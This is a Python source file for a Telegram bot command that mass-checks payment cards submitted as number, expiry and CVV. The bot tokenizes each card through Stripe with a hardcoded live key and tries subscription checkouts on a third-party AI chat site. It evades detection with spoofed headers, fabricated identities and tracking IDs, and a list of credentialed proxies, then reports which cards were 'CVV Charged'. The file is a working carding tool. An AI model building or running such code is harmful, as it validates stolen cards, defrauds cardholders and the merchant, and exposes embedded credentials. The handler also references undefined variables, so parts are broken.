import time
import random
import string
import re
from EQUROBOT import app
from EQUROBOT.core.mongo import has_premium_access
from collections import defaultdict
from aiohttp import ClientSession
from pyrogram import Client, filters
from fake_useragent import UserAgent
import requests

card_pattern = re.compile(r"(\d{15,16})[|/:](\d{2})[|/:](\d{2,4})[|/:](\d{3,4})")

user_request_times = defaultdict(list)



user_agent = UserAgent()
user = user_agent.random

first_names = ["JAMES", "JOHN", "ROBERT", "MICHAEL", "WILLIAM", "DAVID"]
last_names = ["SMITH", "JOHNSON", "WILLIAMS", "JONES"]

def generate_random_name():
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    return f"{first_name} {last_name}"

def generate_number():
    return int("".join([str(random.randint(0, 9)) for _ in range(15)]))

def generate_fb_id():
    prefix = "fb.1."
    first_number = "".join([str(random.randint(0, 9)) for _ in range(random.randint(13, 14))])
    second_number = "".join([str(random.randint(0, 9)) for _ in range(18)])
    return prefix + first_number + "." + second_number

def generate_ten_digit_number():
    return int("".join([str(random.randint(0, 9)) for _ in range(10)]))

def generate_two_part_number():
    first_part = "".join([str(random.randint(0, 9)) for _ in range(9)])
    second_part = "".join([str(random.randint(0, 9)) for _ in range(10)])
    return f"{first_part}.{second_part}"

def generate_complex_id():
    def random_hex_string(length):
        return "".join(random.choice(string.hexdigits.lower()) for _ in range(length))
    part1 = random_hex_string(8)
    part2 = random_hex_string(4)
    part3 = random_hex_string(4)
    part4 = random_hex_string(4)
    part5 = random_hex_string(24)
    return f"{part1}-{part2}-{part3}-{part4}-{part5}"

def generate_complex_id_with_extra():
    def random_hex_string(length):
        return "".join(random.choice(string.hexdigits.lower()) for _ in range(length))
    part1 = random_hex_string(8)
    part2 = random_hex_string(4)
    part3 = random_hex_string(4)
    part4 = random_hex_string(4)
    part5 = random_hex_string(12)
    extra_part = random_hex_string(8)
    return f"{part1}-{part2}-{part3}-{part4}-{part5}{extra_part}"

def generate_custom_id():
    def random_hex_string(length):
        return "".join(random.choice(string.hexdigits.lower()) for _ in range(length))
    part1 = random_hex_string(8)
    part2 = random_hex_string(4)
    part3 = random_hex_string(4)
    part4 = random_hex_string(4)
    part5 = random_hex_string(12)
    extra_part = random_hex_string(7)
    return f"{part1}-{part2}-{part3}-{part4}-{part5}{extra_part}"

def generate_64_hex_string():
    return "".join(random.choice(string.hexdigits.upper()) for _ in range(64))

def generate_random_email():
    username = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domain = random.choice(["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"])
    return f"{username}@{domain}"

def generate_random_user_id():
    return "".join(random.choices(string.ascii_letters + string.digits, k=21))

def generate_new_data():
    return {
        'email': generate_random_email(),
        'user_id': generate_random_user_id(),
        'fbp': generate_fb_id(),
        'pixel_id': generate_number(),
        'ga_params': {
            'session_id': generate_ten_digit_number(),
            'client_id': generate_two_part_number(),
        },
        'external_id': generate_64_hex_string(),
    }

proxy_list = [
    "http://tickets:proxyon145@107.172.229.182:12345",
    "http://tickets:proxyon145@104.160.17.116:12345",
    "http://tickets:proxyon145@198.46.172.86:12345",
    "http://tickets:proxyon145@50.3.137.165:12345",
    "http://tickets:proxyon145@162.212.170.77:12345",
    "http://tickets:proxyon145@23.94.251.43:12345",
    "http://tickets:proxyon145@162.212.170.252:12345",
    "http://tickets:proxyon145@104.206.81.209:12345",
    "http://tickets:proxyon145@23.104.162.39:12345",
    "http://tickets:proxyon145@192.227.241.115:12345",
]

async def check_card(card_info):
    card = card_info.split("|")
    if len(card) != 4 or not all(card):
        return f"Invalid card details for `{card_info}`."

    cc, mm, yy, cvv = card
    start_time = time.time()
    results = []
    proxy = random.choice(proxy_list)
    proxies = {"http": proxy, "https": proxy}

    async with ClientSession() as session:
        stripe_url = "https://api.stripe.com/v1/tokens"
        stripe_headers = {
            "authority": "api.stripe.com",
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": user,
        }

        stripe_data = {
            "guid": generate_complex_id(),
            "muid": generate_complex_id_with_extra(),
            "sid": generate_custom_id(),
            "referrer": "https://chaton.ai",
            "time_on_page": "416544",
            "card[name]": generate_random_name(),
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "payment_user_agent": "stripe.js/883a2ae1fb; stripe-js-v3/883a2ae1fb; split-card-element",
            "pasted_fields": "number",
            "key": "pk_live_51OFuqbJI5eePoNHYcArch2y62M97lkY2aKMcQbz8dnPUI27KX31LELyGkhWUJG9Jo8cwVLdrXj07KQQ1YXm4Sqyv00iW4AshPu",
        }

        try:
            async with session.post(stripe_url, headers=stripe_headers, data=stripe_data, proxy=proxy) as response:
                if response.status == 200:
                    json_response = await response.json()
                    token = json_response.get("id")
                    if not token:
                        error_message = json_response.get("message", "Unknown error")
                        return f"𝗖𝗮𝗿𝗱: `{cc}|{mm}|{yy}|{cvv}`n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {error_message}"
                else:
                    return f"Failed to get token. Status code: {response.status}. Reason: {await response.text()}"

        except Exception as e:
            return f"Error during Stripe request: {e}"

        chaton_url = "https://pa.aiby.mobi/api/v1.0/chatonweb/checkout_card"
        chaton_headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Origin": "https://chaton.ai",
            "Referer": "https://chaton.ai/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
            "User-Agent": user,
            "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
        }

        for attempt in range(3):
            new_data = generate_new_data()
            chaton_data = {
                "application": "chaton-web",
                "product_id": "prod_PVV6Gq8gidk9Qy",
                "email": new_data['email'],
                "user_id": new_data['user_id'],
                "token": token,
                "external_id": new_data['external_id'],
                "fbp": new_data['fbp'],
                "pixel_id": new_data['pixel_id'],
                "ga_params": new_data['ga_params'],
            }

            try:
                chaton_response = requests.post(
                    chaton_url, headers=chaton_headers, json=chaton_data, proxies=proxies, timeout=10
                )

                response_text = chaton_response.text
                if "Card declined" in response_text:
                    status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
                    resp = "Your card was declined."
                    results.append(f"𝗖𝗮𝗿𝗱: `{cc}|{mm}|{yy}|{cvv}`\n𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {resp}\n")
                    break

                if chaton_response.status_code == 404 and "This user has active status" in chaton_response.text:
                    results.append(f"Card `{cc}|{mm}|{yy}|{cvv}` already added, retrying with new data...")
                    continue

                if "customer_id" in response_text and "subscription_id" in response_text:
                    status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱✅"
                    resp = "CVV Charged"
                    results.append(f"𝗖𝗮𝗿𝗱: `{cc}|{mm}|{yy}|{cvv}`\n𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {resp}\n")
                    break

            except requests.exceptions.RequestException as e:
                results.append(f"Failed to contact Chaton API. Error: {str(e)}")
                break

    execution_time = time.time() - start_time
    results.append(f"𝗧𝗶𝗺𝗲: {round(execution_time, 2)}s")
    return "\n".join(results)



@app.on_message(filters.command("msvv", prefixes=[".", "/", "!"]))
async def handle_check_card(client, message):
    user_id = message.from_user.id
    
    if not await has_premium_access(message.from_user.id):
        return await message.reply_text("You don't have premium access. contact my owner to purchase premium")

    if not allowed:
        await message.reply(f"🚫 **Anti-Spam** Detected! Try again after {remaining_time} seconds.")
        return

    try:
        cards_info = message.text.split(maxsplit=1)[1].strip().split("\n")
    except IndexError:
        await message.reply("Please provide card details in the format: `card_number|mm|yy|cvv`.")
        return

    processing_msg = await message.reply("Processing your request...")
    start_time = time.time()
    results = []

    try:
        for card_info in cards_info:
            if not card_pattern.fullmatch(card_info):
                results.append(f"Invalid card details: `{card_info}`. Please provide in the format: `card_number|mm|yy|cvv`.")
                continue

            response = await check_card(card_info)
            results.append(response)

        final_response = "𝗠𝗮𝘀𝘀 𝗦𝘁𝗿𝗶𝗽𝗲 𝗦𝗶𝘁𝗲𝗯𝗮𝘀𝗲𝗱\n\n"
        final_response += "\n\n".join(results)
        final_response += f"\n\n𝗧𝗶𝗺𝗲: {round(time.time() - start_time, 2)}s\n𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: @{message.from_user.username}"

        await processing_msg.edit_text(final_response)

    except Exception as e:
        await processing_msg.edit_text(f"An error occurred: {str(e)}")
